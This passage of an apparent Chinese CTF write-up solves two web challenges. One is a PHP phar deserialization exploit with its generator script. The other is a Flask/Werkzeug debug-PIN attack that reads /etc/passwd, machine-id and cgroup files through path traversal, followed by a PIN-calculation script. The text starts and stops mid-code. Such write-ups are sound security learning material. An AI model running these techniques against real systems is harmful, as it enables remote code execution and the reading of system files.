class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;title&gt;查看图片&lt;/title&gt;</span><br><span class="line">&lt;link type = <span class="string">&quot;text/css&quot;</span> rel = <span class="string">&quot;stylesheet&quot;</span> href = <span class="string">&quot;css/style.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script type = <span class="string">&quot;text/javascript&quot;</span> color = <span class="string">&quot;0,0,255&quot;</span> opacity = <span class="string">&#x27;0.7&#x27;</span> zIndex = <span class="string">&quot;-2&quot;</span> count = <span class="string">&quot;99&quot;</span> src = <span class="string">&#x27;js/canvas-nest.min.js&#x27;</span>&gt;&lt;/script&gt; &lt;!-- 动态背景 --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#include_once &quot;flag.php&quot;; </span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$dir</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;dir = <span class="string">&#x27;upload/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&#x27;echo &quot;&lt;div style=\&quot;text-align: center;position: absolute;left: 0;bottom: 0;width: 100%;height: 30px;\&quot;&gt;Powered by: xxx&lt;/div&gt;&quot;;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$this</span>-&gt;dir)) &#123;</span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="variable">$this</span>-&gt;dir, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_file_list</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_file_list</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_file_list</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">2</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$file</span>); <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p align=\&quot;center\&quot; style=\&quot;font-weight: bold;\&quot;&gt;[&quot;</span>.<span class="title function_ invoke__">strval</span>(<span class="variable">$i</span> - <span class="number">1</span>).<span class="string">&quot;]  <span class="subst">$file</span>[<span class="subst">$i</span>] &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_img</span>(<span class="params"><span class="variable">$file_name</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$file_name</span>;</span><br><span class="line"><span class="variable">$width</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$name</span>)[<span class="number">0</span>];</span><br><span class="line"><span class="variable">$height</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$name</span>)[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$times</span> = <span class="variable">$width</span> / <span class="number">200</span>;</span><br><span class="line"><span class="variable">$width</span> /= <span class="variable">$times</span>;</span><br><span class="line"><span class="variable">$height</span> /= <span class="variable">$times</span>;</span><br><span class="line"><span class="variable">$template</span> = <span class="string">&quot;&lt;img style=\&quot;clear: both;display: block;margin: auto;\&quot; src=\&quot;<span class="subst">$this</span>-&gt;dir<span class="subst">$name</span>\&quot; alt=\&quot;<span class="subst">$file_name</span>\&quot; width = \&quot;<span class="subst">$width</span>\&quot; height = \&quot;<span class="subst">$height</span>\&quot;&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$template</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delete_img</span>(<span class="params"><span class="variable">$file_name</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$file_name</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$name</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p align=\&quot;center\&quot; style=\&quot;font-weight: bold;\&quot;&gt;成功删除! 3s后跳转&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;refresh:3;url=view.php&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Can not delete!&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p align=\&quot;center\&quot; style=\&quot;font-weight: bold;\&quot;&gt;找不到这个文件! &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ins</span> = <span class="keyword">new</span> <span class="title class_">View</span>();</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$ins</span>-&gt;dir);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;当前目录为 &quot;</span> . <span class="variable">$ins</span>-&gt;dir . <span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ins</span>-&gt;<span class="title function_ invoke__">show_file_list</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>];</span><br><span class="line"><span class="variable">$ins</span>-&gt;<span class="title function_ invoke__">show_img</span>(<span class="variable">$file_name</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;delete&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;delete&#x27;</span>];</span><br><span class="line"><span class="variable">$ins</span>-&gt;<span class="title function_ invoke__">delete_img</span>(<span class="variable">$file_name</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$ins</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="comment">//view.php</span></span><br></pre></td></tr></table></figure><p>而view.php内能够明显看到在<code>__destruct()</code>方法内有eval函数</p><p>而<code>__destruct()</code>明显是反序列化的标志，而该方法又在delete_img函数内</p><p>而如果<code>delete作为post参数的时候，就会将其内容传递到delete_img函数内</code>，再加之上传文件，所以应该是phar反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dir</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&#x27;show_source(&quot;flag.php&quot;);&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; startBuffering;</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">View</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行后获得phar.phar，将其上传即可</p><p>然后通过post的delete触发phar即可</p><p><code>delete=phar://phar.phar</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Can not delete!</span><br><span class="line">Powered by: xxx</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;flag&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;b&gt;?&lt;/b&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&#x27;HSCSEC&#123;63b93beb-9edd-486b-aab3-58ad12621db0&#125;&#x27;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h2><span id="ezflask"> EZFlask</span></h2><p>Flask pin码攻击</p><p>不过这个东西最恶心的地方就在我找到的几个脚本里生成的pin码都是错的…</p><p>都不知道什么原因…</p><h3><span id="什么是flask的pin码攻击呢"> 什么是flask的pin码攻击呢？</span></h3><p>简单的说就是你可以通过报错的页面进入debug模式，直接获得控制台（</p><p>但是一般都会被锁定，并且让你输入pin码</p><p>而我们的pin码攻击此时就要派上用场了，我们可以通过计算获得pin码并且解锁</p><h3><span id="如何进行pin码的计算"> 如何进行pin码的计算：</span></h3><p>你要获取以下几个东西：</p><ul><li>机器的mac地址：可以通过访问<code>/sys/class/net/eth0/address</code>获得</li><li>机器id：访问<code>/etc/machine-id</code>或者<code>/proc/sys/kernel/random/boot_id</code>，二选一</li><li>CPUID:<code>/proc/self/cgroup或者/proc/1/cpuset</code></li><li>modname：默认为flask.app</li><li>用户名：访问<code>etc/passwd</code>获得</li><li>app.py的绝对路径：通过报错页面获得</li></ul><p>然后使用脚本计算即可</p><h3><span id="解题"> 解题：</span></h3><p>页面提示：<code>/view?filename=app.py</code>，输入后获得app.py的源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template_string app = Flask(__name__) @app.route(<span class="string">&quot;/&quot;</span>) <span class="keyword">def</span> <span class="title function_">index</span>(): <span class="keyword">return</span> <span class="string">&#x27;GET /view?filename=app.py&#x27;</span> @app.route(<span class="string">&quot;/view&quot;</span>) <span class="keyword">def</span> <span class="title function_">viewFile</span>(): filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>) <span class="keyword">if</span>(<span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> filename): <span class="keyword">return</span> <span class="string">&quot;WAF&quot;</span> <span class="keyword">if</span>(<span class="string">&quot;cgroup&quot;</span> <span class="keyword">in</span> filename): <span class="keyword">return</span> <span class="string">&quot;WAF&quot;</span> <span class="keyword">if</span>(<span class="string">&quot;self&quot;</span> <span class="keyword">in</span> filename): <span class="keyword">return</span> <span class="string">&quot;WAF&quot;</span> <span class="keyword">try</span>: <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f: templates=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#123;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(f.read()) <span class="keyword">return</span> render_template_string(templates) <span class="keyword">except</span> Exception <span class="keyword">as</span> e: templates=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">文件不存在</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> <span class="keyword">return</span> render_template_string(templates) <span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>: app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">80</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#此处过滤了cgroup、self和flag</span></span><br></pre></td></tr></table></figure><p>猜测我们可以通过filename来进行文件的读取，并且如果我们直接访问<code>/view</code>页面会报错，通过报错页面我们获得app.py的绝对路径：<code>/usr/local/lib/python3.8/site-packages/flask/app.py</code></p><img src="/2023/02/19/HSCCTF-2th-WriteUp/5.png" class title="ewe"><p>通过<code>/view?filename=/sys/class/net/eth0/address</code>获取机器mac地址：<code>02:42:ac:02:0b:47</code></p><img src="/2023/02/19/HSCCTF-2th-WriteUp/2.png" class title="bwb"><p>通过<code>/view?filename=/etc/machine-id</code>获得机器码：<code>7265fe765262551a676151a24c02b7b6</code></p><img src="/2023/02/19/HSCCTF-2th-WriteUp/3.png" class title="cwc"><p>通过<code>/view?filename=/proc/1/cpuset</code>获取CPUID:</p><p><code>2b577240d0290d4743c464cf4a8375c8c1a52d7eae4545baaf602d2577177a70</code>（docker后面的一串）</p><img src="/2023/02/19/HSCCTF-2th-WriteUp/4.png" class title="dwd"><p>通过<code>/view?filename=../../etc/passwd</code>获取用户名：</p><p><code>app</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/<span class="built_in">bin</span>/bash daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:/usr/sbin:/usr/sbin/nologin <span class="built_in">bin</span>:x:<span class="number">2</span>:<span class="number">2</span>:<span class="built_in">bin</span>:/<span class="built_in">bin</span>:/usr/sbin/nologin sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:/dev:/usr/sbin/nologin sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:/<span class="built_in">bin</span>:/<span class="built_in">bin</span>/sync games:x:<span class="number">5</span>:<span class="number">60</span>:games:/usr/games:/usr/sbin/nologin man:x:<span class="number">6</span>:<span class="number">12</span>:man:/var/cache/man:/usr/sbin/nologin lp:x:<span class="number">7</span>:<span class="number">7</span>:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:<span class="number">8</span>:<span class="number">8</span>:mail:/var/mail:/usr/sbin/nologin news:x:<span class="number">9</span>:<span class="number">9</span>:news:/var/spool/news:/usr/sbin/nologin uucp:x:<span class="number">10</span>:<span class="number">10</span>:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:<span class="number">13</span>:<span class="number">13</span>:proxy:/<span class="built_in">bin</span>:/usr/sbin/nologin www-data:x:<span class="number">33</span>:<span class="number">33</span>:www-data:/var/www:/usr/sbin/nologin backup:x:<span class="number">34</span>:<span class="number">34</span>:backup:/var/backups:/usr/sbin/nologin <span class="built_in">list</span>:x:<span class="number">38</span>:<span class="number">38</span>:Mailing <span class="type">List</span> Manager:/var/<span class="built_in">list</span>:/usr/sbin/nologin irc:x:<span class="number">39</span>:<span class="number">39</span>:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:<span class="number">41</span>:<span class="number">41</span>:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:<span class="number">65534</span>:<span class="number">65534</span>:nobody:/nonexistent:/usr/sbin/nologin _apt:x:<span class="number">100</span>:<span class="number">65534</span>::/nonexistent:/usr/sbin/nologin app:x:<span class="number">1000</span>:<span class="number">1000</span>::/home/app:/<span class="built_in">bin</span>/sh</span><br></pre></td></tr></table></figure><p>也就是bin/sh的前一个</p><p>那直接上脚本即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">mac = <span class="string">&#x27;02:42:ac:02:0b:47&#x27;</span> <span class="comment"># /sys/class/net/eth0/address</span></span><br><span class="line">mac = <span class="built_in">int</span>(<span class="string">&#x27;0x&#x27;</span> + mac.replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;&#x27;</span>), <span class="number">16</span>) <span class="comment"># 1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup 或 /proc/1/cpuset</span></span><br><span class="line">machine_id = <span class="string">b&#x27;7265fe765262551a676151a24c02b7b6&#x27;</span></span><br><span class="line">cgroup = <span class="string">b&#x27;2b577240d0290d4743c464cf4a8375c8c1a52d7eae4545baaf602d2577177a70&#x27;</span><span class="comment">#78eeeb157a1ad5f7a12aeaa370d1578a20a86e472023dfe77a700853d114b63f</span></span><br><span class="line">modname = <span class="string">&#x27;flask.app&#x27;</span></span><br><span class="line">username = <span class="string">&#x27;app&#x27;</span></span><br><span class="line">file_path = <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_pin</span>(<span class="params">pin: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(<span class="string">f&quot;<span class="subst">&#123;pin&#125;</span> added salt&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;replace&quot;</span>)).hexdigest()[:<span class="number">12</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_machine_id</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_generate</span>():</span><br><span class="line">        linux = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># machine-id is stable across boots, boot_id is not.</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">&quot;/etc/machine-id&quot;</span>, <span class="string">&quot;/proc/sys/kernel/random/boot_id&quot;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    value = f.readline().strip()</span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> value:</span><br><span class="line">                linux += value</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Containers share the same machine id, add some cgroup</span></span><br><span class="line">        <span class="comment"># information. This is used outside containers too but should be</span></span><br><span class="line">        <span class="comment"># relatively stable across boots.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/proc/self/cgroup&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                linux += f.readline().strip().rpartition(<span class="string">b&quot;/&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">except</span> OSError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> linux</span><br><span class="line"></span><br><span class="line">    _machine_id = _generate()</span><br><span class="line">    <span class="keyword">return</span> machine_id + cgroup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pin_and_cookie_name</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Given an application object this returns a semi-stable 9 digit pin</span></span><br><span class="line"><span class="string">    code and a random key.  The hope is that this is stable between</span></span><br><span class="line"><span class="string">    restarts to not make debugging particularly frustrating.  If the pin</span></span><br><span class="line"><span class="string">    was forcefully disabled this returns `None`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Second item in the resulting tuple is the cookie name for remembering.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># This information only exists to make the cookie unique on the</span></span><br><span class="line">    <span class="comment"># computer, not as a security feature.</span></span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">        file_path,</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This information is here to make it harder for an attacker to</span></span><br><span class="line">    <span class="comment"># guess the cookie name.  They are unlikely to be contained anywhere</span></span><br><span class="line">    <span class="comment"># within the unauthenticated debug page.</span></span><br><span class="line">    private_bits = [<span class="built_in">str</span>(mac), get_machine_id()]</span><br><span class="line"></span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">    cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line">    <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">    num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line">    rv = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line">    <span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span 